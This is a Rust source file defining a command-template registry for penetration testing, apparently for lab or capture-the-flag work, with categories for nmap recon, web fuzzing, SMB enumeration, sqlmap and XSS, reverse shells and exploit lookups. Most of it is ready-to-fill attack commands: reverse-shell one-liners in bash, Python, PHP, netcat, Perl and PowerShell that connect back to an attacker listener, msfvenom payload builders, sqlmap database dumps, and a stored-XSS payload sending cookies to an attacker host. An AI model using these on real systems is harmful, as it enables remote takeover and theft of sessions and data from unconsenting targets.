use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize)]
pub struct Command {
    pub name: &'static str,
    pub description: &'static str,
    pub template: &'static str,
    pub params: &'static [Param],
    pub tags: &'static [&'static str],
    pub category: Category,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum Category {
    Recon,
    Web,
    Smb,
    Sqli,
    Shells,
    Cve,
}

impl Category {
    pub fn label(&self) -> &'static str {
        match self {
            Category::Recon => "🔍 Recon / nmap",
            Category::Web => "🌐 Web (ffuf/gobuster/nikto)",
            Category::Smb => "📁 SMB / enum4linux",
            Category::Sqli => "💉 SQLi / XSS helpers",
            Category::Shells => "🐚 Reverse Shells",
            Category::Cve => "🔥 CVE Lookups",
        }
    }

    pub fn all() -> Vec<Category> {
        vec![
            Category::Recon,
            Category::Web,
            Category::Smb,
            Category::Sqli,
            Category::Shells,
            Category::Cve,
        ]
    }

    pub fn from_str(s: &str) -> Option<Category> {
        match s.to_lowercase().as_str() {
            "recon" => Some(Category::Recon),
            "web" => Some(Category::Web),
            "smb" => Some(Category::Smb),
            "sqli" => Some(Category::Sqli),
            "shells" => Some(Category::Shells),
            "cve" => Some(Category::Cve),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct Param {
    pub key: &'static str,
    pub label: &'static str,
    pub default: Option<&'static str>,
}

// ─── RECON ──────────────────────────────────────────────────────────────────

pub const RECON_COMMANDS: &[Command] = &[
    Command {
        name: "Quick Scan",
        description: "Fast top-1000 port scan",
        template: "nmap -T4 -F {target}",
        params: &[Param { key: "target", label: "Target IP/host", default: None }],
        tags: &["nmap", "fast", "ports"],
        category: Category::Recon,
    },
    Command {
        name: "Full TCP Scan",
        description: "All 65535 TCP ports",
        template: "nmap -p- -T4 --open {target}",
        params: &[Param { key: "target", label: "Target IP/host", default: None }],
        tags: &["nmap", "full", "tcp"],
        category: Category::Recon,
    },
    Command {
        name: "Service & Version Detection",
        description: "Detect services + versions on open ports",
        template: "nmap -sV -sC -p {ports} {target}",
        params: &[
            Param { key: "target", label: "Target IP/host", default: None },
            Param { key: "ports", label: "Ports (e.g. 22,80,443)", default: Some("22,80,443") },
        ],
        tags: &["nmap", "versions", "services"],
        category: Category::Recon,
    },
    Command {
        name: "OS Detection",
        description: "Aggressive OS fingerprinting (root required)",
        template: "nmap -O --osscan-guess {target}",
        params: &[Param { key: "target", label: "Target IP/host", default: None }],
        tags: &["nmap", "os", "fingerprint"],
        category: Category::Recon,
    },
    Command {
        name: "Stealth SYN Scan",
        description: "Half-open SYN scan (root required)",
        template: "nmap -sS -T2 -p- {target}",
        params: &[Param { key: "target", label: "Target IP/host", default: None }],
        tags: &["nmap", "stealth", "syn"],
        category: Category::Recon,
    },
    Command {
        name: "UDP Scan (top 100)",
        description: "Scan top 100 UDP ports",
        template: "nmap -sU --top-ports 100 {target}",
        params: &[Param { key: "target", label: "Target IP/host", default: None }],
        tags: &["nmap", "udp"],
        category: Category::Recon,
    },
    Command {
        name: "Vuln Scripts",
        description: "Run nmap vuln NSE scripts",
        template: "nmap --script vuln -p {ports} {target}",
        params: &[
            Param { key: "target", label: "Target IP/host", default: None },
            Param { key: "ports", label: "Ports", default: Some("80,443,22") },
        ],
        tags: &["nmap", "scripts", "vuln"],
        category: Category::Recon,
    },
    Command {
        name: "Ping Sweep (subnet)",
        description: "Discover live hosts on a subnet",
        template: "nmap -sn {subnet}/24",
        params: &[Param { key: "subnet", label: "Subnet (e.g. 192.168.1.0)", default: Some("192.168.1.0") }],
        tags: &["nmap", "discovery", "subnet"],
        category: Category::Recon,
    },
    Command {
        name: "Aggressive Full Scan",
        description: "Full -A scan: OS, versions, scripts, traceroute",
        template: "nmap -A -T4 -p- {target} -oN {output}",
        params: &[
            Param { key: "target", label: "Target IP/host", default: None },
            Param { key: "output", label: "Output file", default: Some("nmap_full.txt") },
        ],
        tags: &["nmap", "aggressive", "full"],
        category: Category::Recon,
    },
];

// ─── WEB ────────────────────────────────────────────────────────────────────

pub const WEB_COMMANDS: &[Command] = &[
    Command {
        name: "ffuf - Directory Fuzz",
        description: "Fuzz directories with a wordlist",
        template: "ffuf -u http://{target}/FUZZ -w {wordlist} -t 50 -mc 200,301,302",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "wordlist", label: "Wordlist path", default: Some("/usr/share/wordlists/dirb/common.txt") },
        ],
        tags: &["ffuf", "fuzz", "dirs"],
        category: Category::Web,
    },
    Command {
        name: "ffuf - Subdomain Fuzz",
        description: "Fuzz subdomains via Host header",
        template: "ffuf -u http://{target}/ -H 'Host: FUZZ.{target}' -w {wordlist} -mc 200",
        params: &[
            Param { key: "target", label: "Domain (e.g. target.htb)", default: None },
            Param { key: "wordlist", label: "Wordlist path", default: Some("/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt") },
        ],
        tags: &["ffuf", "subdomain", "vhost"],
        category: Category::Web,
    },
    Command {
        name: "ffuf - Parameter Fuzz (GET)",
        description: "Fuzz GET parameters",
        template: "ffuf -u 'http://{target}/{path}?FUZZ=test' -w {wordlist} -mc 200",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("index.php") },
            Param { key: "wordlist", label: "Wordlist", default: Some("/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt") },
        ],
        tags: &["ffuf", "params", "get"],
        category: Category::Web,
    },
    Command {
        name: "gobuster - Dir",
        description: "Directory enumeration with gobuster",
        template: "gobuster dir -u http://{target} -w {wordlist} -x php,html,txt -t 40",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "wordlist", label: "Wordlist path", default: Some("/usr/share/wordlists/dirb/common.txt") },
        ],
        tags: &["gobuster", "dirs", "enum"],
        category: Category::Web,
    },
    Command {
        name: "gobuster - DNS",
        description: "DNS subdomain enumeration",
        template: "gobuster dns -d {domain} -w {wordlist} -t 30",
        params: &[
            Param { key: "domain", label: "Domain", default: None },
            Param { key: "wordlist", label: "Wordlist", default: Some("/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt") },
        ],
        tags: &["gobuster", "dns", "subdomains"],
        category: Category::Web,
    },
    Command {
        name: "nikto - Full Scan",
        description: "Full web vulnerability scan",
        template: "nikto -h http://{target} -o {output}",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "output", label: "Output file", default: Some("nikto_out.txt") },
        ],
        tags: &["nikto", "vulns", "scan"],
        category: Category::Web,
    },
    Command {
        name: "whatweb - Tech Fingerprint",
        description: "Identify web technologies",
        template: "whatweb -a 3 http://{target}",
        params: &[Param { key: "target", label: "Target host", default: None }],
        tags: &["whatweb", "fingerprint", "tech"],
        category: Category::Web,
    },
    Command {
        name: "curl - Check Headers",
        description: "Dump response headers",
        template: "curl -sI http://{target}/{path}",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("") },
        ],
        tags: &["curl", "headers"],
        category: Category::Web,
    },
];

// ─── SMB ────────────────────────────────────────────────────────────────────

pub const SMB_COMMANDS: &[Command] = &[
    Command {
        name: "enum4linux - Full Enum",
        description: "Full SMB enumeration",
        template: "enum4linux -a {target}",
        params: &[Param { key: "target", label: "Target IP", default: None }],
        tags: &["enum4linux", "smb", "full"],
        category: Category::Smb,
    },
    Command {
        name: "enum4linux-ng",
        description: "Modern enum4linux rewrite",
        template: "enum4linux-ng -A {target} -oA {output}",
        params: &[
            Param { key: "target", label: "Target IP", default: None },
            Param { key: "output", label: "Output prefix", default: Some("smb_enum") },
        ],
        tags: &["enum4linux-ng", "smb"],
        category: Category::Smb,
    },
    Command {
        name: "smbclient - List Shares",
        description: "List available SMB shares",
        template: "smbclient -L //{target} -N",
        params: &[Param { key: "target", label: "Target IP", default: None }],
        tags: &["smbclient", "shares"],
        category: Category::Smb,
    },
    Command {
        name: "smbclient - Connect Share",
        description: "Connect to a specific share",
        template: "smbclient //{target}/{share} -U {user}",
        params: &[
            Param { key: "target", label: "Target IP", default: None },
            Param { key: "share", label: "Share name", default: Some("C$") },
            Param { key: "user", label: "Username", default: Some("guest") },
        ],
        tags: &["smbclient", "connect"],
        category: Category::Smb,
    },
    Command {
        name: "nmap SMB Scripts",
        description: "Run SMB-specific NSE scripts",
        template: "nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 139,445 {target}",
        params: &[Param { key: "target", label: "Target IP", default: None }],
        tags: &["nmap", "smb", "scripts"],
        category: Category::Smb,
    },
    Command {
        name: "crackmapexec - SMB",
        description: "SMB recon with crackmapexec",
        template: "crackmapexec smb {target} -u {user} -p {pass} --shares",
        params: &[
            Param { key: "target", label: "Target IP", default: None },
            Param { key: "user", label: "Username", default: Some("guest") },
            Param { key: "pass", label: "Password", default: Some("''") },
        ],
        tags: &["cme", "crackmapexec", "smb"],
        category: Category::Smb,
    },
];

// ─── SQLI / XSS ─────────────────────────────────────────────────────────────

pub const SQLI_COMMANDS: &[Command] = &[
    Command {
        name: "sqlmap - Basic GET",
        description: "Test GET parameter for SQL injection",
        template: "sqlmap -u 'http://{target}/{path}?{param}=1' --batch --dbs",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("index.php") },
            Param { key: "param", label: "Parameter name", default: Some("id") },
        ],
        tags: &["sqlmap", "sqli", "get"],
        category: Category::Sqli,
    },
    Command {
        name: "sqlmap - POST Body",
        description: "Test POST form for SQL injection",
        template: "sqlmap -u 'http://{target}/{path}' --data='{data}' --batch --dbs",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("login.php") },
            Param { key: "data", label: "POST body", default: Some("username=admin&password=pass") },
        ],
        tags: &["sqlmap", "sqli", "post"],
        category: Category::Sqli,
    },
    Command {
        name: "sqlmap - Dump DB",
        description: "Dump a specific database",
        template: "sqlmap -u 'http://{target}/{path}?{param}=1' -D {db} --dump --batch",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("index.php") },
            Param { key: "param", label: "Parameter", default: Some("id") },
            Param { key: "db", label: "Database name", default: Some("users") },
        ],
        tags: &["sqlmap", "dump", "db"],
        category: Category::Sqli,
    },
    Command {
        name: "sqlmap - Cookie Auth",
        description: "Test with session cookie",
        template: "sqlmap -u 'http://{target}/{path}?{param}=1' --cookie='{cookie}' --batch --dbs",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("dashboard.php") },
            Param { key: "param", label: "Parameter", default: Some("id") },
            Param { key: "cookie", label: "Cookie", default: Some("PHPSESSID=abc123") },
        ],
        tags: &["sqlmap", "cookie", "auth"],
        category: Category::Sqli,
    },
    Command {
        name: "XSS - Reflected Test",
        description: "Basic reflected XSS payloads to try",
        template: "# Reflected XSS payloads for: http://{target}/{path}?{param}=\n# Try these:\n\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\n<img src=x onerror=alert(1)>\njavascript:alert(1)",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "path", label: "Path", default: Some("search.php") },
            Param { key: "param", label: "Parameter", default: Some("q") },
        ],
        tags: &["xss", "reflected", "payloads"],
        category: Category::Sqli,
    },
    Command {
        name: "XSS - Stored Payload",
        description: "Stored XSS payload with callback",
        template: "# Stored XSS — inject into {field} at http://{target}\n\n<script>fetch('http://{lhost}:8000/?c='+document.cookie)</script>",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "field", label: "Injectable field", default: Some("comment") },
            Param { key: "lhost", label: "Your listener IP", default: None },
        ],
        tags: &["xss", "stored", "cookie-steal"],
        category: Category::Sqli,
    },
    Command {
        name: "XSS - DOM-Based",
        description: "DOM-based XSS payloads",
        template: "# DOM XSS test for http://{target}/#\n# Fragment-based:\nhttp://{target}/#{payload}\n# Payloads:\n<img src=x onerror=alert(1)>\n\"><img src=x onerror=alert(1)>",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "payload", label: "Initial payload", default: Some("<img src=x onerror=alert(1)>") },
        ],
        tags: &["xss", "dom", "fragment"],
        category: Category::Sqli,
    },
];

// ─── REVERSE SHELLS ─────────────────────────────────────────────────────────

pub const SHELL_COMMANDS: &[Command] = &[
    Command {
        name: "bash TCP",
        description: "Classic bash reverse shell",
        template: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["bash", "tcp", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "Python3 TCP",
        description: "Python3 reverse shell",
        template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["python", "reverse", "pty"],
        category: Category::Shells,
    },
    Command {
        name: "PHP Reverse Shell",
        description: "PHP one-liner reverse shell",
        template: "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["php", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "netcat (with -e)",
        description: "Netcat reverse shell (if -e supported)",
        template: "nc {lhost} {lport} -e /bin/bash",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["nc", "netcat", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "netcat (mkfifo)",
        description: "Netcat reverse shell via mkfifo (no -e needed)",
        template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["nc", "mkfifo", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "Perl Reverse Shell",
        description: "Perl one-liner reverse shell",
        template: "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["perl", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "PowerShell Reverse",
        description: "Windows PowerShell reverse shell",
        template: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["powershell", "windows", "reverse"],
        category: Category::Shells,
    },
    Command {
        name: "Stabilise Shell (Python PTY)",
        description: "Upgrade a dumb shell to a full TTY",
        template: "# On victim:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\n# On attacker:\nstty raw -echo; fg\n# In victim shell:\nexport TERM=xterm\nstty rows {rows} cols {cols}",
        params: &[
            Param { key: "rows", label: "Terminal rows", default: Some("40") },
            Param { key: "cols", label: "Terminal cols", default: Some("220") },
        ],
        tags: &["tty", "upgrade", "pty"],
        category: Category::Shells,
    },
    Command {
        name: "Start Netcat Listener",
        description: "Start an nc listener on your machine",
        template: "nc -lvnp {lport}",
        params: &[
            Param { key: "lport", label: "Port to listen on", default: Some("4444") },
        ],
        tags: &["nc", "listener"],
        category: Category::Shells,
    },
    Command {
        name: "MSFvenom - Linux ELF",
        description: "Generate Linux reverse shell payload",
        template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["msfvenom", "payload", "elf"],
        category: Category::Shells,
    },
    Command {
        name: "MSFvenom - Windows EXE",
        description: "Generate Windows reverse shell payload",
        template: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        params: &[
            Param { key: "lhost", label: "Your IP (LHOST)", default: None },
            Param { key: "lport", label: "Your port (LPORT)", default: Some("4444") },
        ],
        tags: &["msfvenom", "payload", "windows", "exe"],
        category: Category::Shells,
    },
];

// ─── CVE / LOOKUPS ──────────────────────────────────────────────────────────

pub const CVE_COMMANDS: &[Command] = &[
    Command {
        name: "searchsploit - Search",
        description: "Search Exploit-DB offline",
        template: "searchsploit {query}",
        params: &[Param { key: "query", label: "Search term (e.g. 'Apache 2.4.49')", default: None }],
        tags: &["searchsploit", "exploitdb"],
        category: Category::Cve,
    },
    Command {
        name: "searchsploit - Copy Exploit",
        description: "Copy an exploit to current dir",
        template: "searchsploit -m {exploit_path}",
        params: &[Param { key: "exploit_path", label: "Exploit path (from results)", default: Some("linux/remote/12345.py") }],
        tags: &["searchsploit", "copy"],
        category: Category::Cve,
    },
    Command {
        name: "curl - NVD CVE Lookup",
        description: "Fetch CVE details from NVD API",
        template: "curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}' | python3 -m json.tool | grep -E '(descriptions|baseScore|baseSeverity)'",
        params: &[Param { key: "cve_id", label: "CVE ID (e.g. CVE-2021-41773)", default: None }],
        tags: &["nvd", "cve", "api"],
        category: Category::Cve,
    },
    Command {
        name: "nmap - CVE Scripts",
        description: "Run vulners NSE script for CVE detection",
        template: "nmap --script vulners -sV -p {ports} {target}",
        params: &[
            Param { key: "target", label: "Target IP", default: None },
            Param { key: "ports", label: "Ports", default: Some("80,443,22,21") },
        ],
        tags: &["nmap", "vulners", "cve"],
        category: Category::Cve,
    },
    Command {
        name: "wpscan - WordPress",
        description: "Scan WordPress for CVEs & vulns",
        template: "wpscan --url http://{target} --enumerate vp,u --api-token {token}",
        params: &[
            Param { key: "target", label: "Target host", default: None },
            Param { key: "token", label: "WPScan API token (optional)", default: Some("YOUR_TOKEN") },
        ],
        tags: &["wpscan", "wordpress", "cms"],
        category: Category::Cve,
    },
];

// ─── Registry ───────────────────────────────────────────────────────────────

pub fn get_commands(category: &Category) -> &'static [Command] {
    match category {
        Category::Recon => RECON_COMMANDS,
        Category::Web => WEB_COMMANDS,
        Category::Smb => SMB_COMMANDS,
        Category::Sqli => SQLI_COMMANDS,
        Category::Shells => SHELL_COMMANDS,
        Category::Cve => CVE_COMMANDS,
    }
}

/// Fill in template placeholders with provided params
pub fn resolve_template(template: &str, params: &std::collections::HashMap<String, String>) -> String {
    let mut result = template.to_string();
    for (k, v) in params {
        result = result.replace(&format!("{{{}}}", k), v);
    }
    result
}
